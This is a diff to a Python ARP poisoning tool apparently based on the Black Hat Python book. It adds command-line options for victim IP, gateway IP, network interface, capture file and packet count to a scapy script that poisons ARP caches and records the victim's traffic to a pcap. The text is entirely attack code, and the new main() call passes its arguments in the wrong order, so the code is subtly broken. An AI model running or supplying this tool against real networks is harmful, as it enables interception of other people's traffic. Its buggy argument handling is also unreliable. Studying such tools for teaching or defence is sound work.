@@ -4,19 +4,42 @@
 This is an arp poisoning tool from BHP book.
 
 Improvement done:
-
-Improvement to do:
 - add argparse to manage arguments
 - add parmeter for output file
 - move output file default path to user home
+
+Improvement to do:
 - need to improve end after CTRL-C
 """
 from multiprocessing import Process
 from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap
 
+import argparse
 import os
 import sys
 import time
+
+
+def manageArguments() -> argparse.Namespace:
+    """
+    Function to parse arguments
+    :return: a parse_args object
+    """
+    if os.name == 'nt':
+        homePath = os.environ["USERPROFILE"]+'\\\\'
+    else:
+        homePath = os.environ["HOME"] + '/'
+    defaultFile = homePath+'packet.pcap'
+    parser = argparse.ArgumentParser(
+        description='BHP ARP poisoner.\n Need root or administrator right.',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='Example: python3 proxy.py -v 192.168.0.55 -g 192.168.0.254 -n eth0 -o /root/packet.pcap -c 100\n')
+    parser.add_argument('-v', '--victim', required=True, help='The victim IP.')
+    parser.add_argument('-g', '--gateway', required=True, help='The gateway IP of the victim.')
+    parser.add_argument('-n', '--nic', required=True, help='The nic with access to the victim and gateway network.')
+    parser.add_argument('-o', '--output', default=defaultFile, help='The file where packet are saved.')
+    parser.add_argument('-c', '--count', default=200, help='The number of packet to capture.')
+    return parser.parse_args()
 
 
 def get_mac(targetip):
@@ -27,12 +50,14 @@ def get_mac(targetip):
 
 
 class Arper:
-    def __init__(self, victim, gateway, interface='en0'):
+    def __init__(self, victim, gateway, file, interface, count=200):
         self.victim = victim
         self.victimmac = get_mac(victim)
         self.gateway = gateway
         self.gatewaymac = get_mac(gateway)
         self.interface = interface
+        self.file = file
+        self.count = count
         conf.iface = interface
         conf.verb = 0
         print(f'Initialized {self.interface}:')
@@ -82,12 +107,12 @@ class Arper:
             else:
                 time.sleep(2)
 
-    def sniff(self, count=200):
+    def sniff(self):
         time.sleep(5)
-        print(f'Sniffing {count} packets.')
+        print(f'Sniffing {self.count} packets.')
         bpf_filter = f"ip host {self.victim}"
-        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
-        wrpcap('arper.pcap', packets)
+        packets = sniff(count=self.count, filter=bpf_filter, iface=self.interface)
+        wrpcap(self.file, packets)
         print('Got the packets!')
         self.restore()
         self.poison_thread.terminate()
@@ -114,9 +139,9 @@ class Arper:
 
 
 def main():
-    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
-    myarp = Arper(victim, gateway, interface)
-    myarp.run()
+    myArgs = manageArguments()
+    myArp = Arper(myArgs.victim, myArgs.gateway, myArgs.nic, myArgs.count)
+    myArp.run()
 
 
 if __name__ == '__main__':
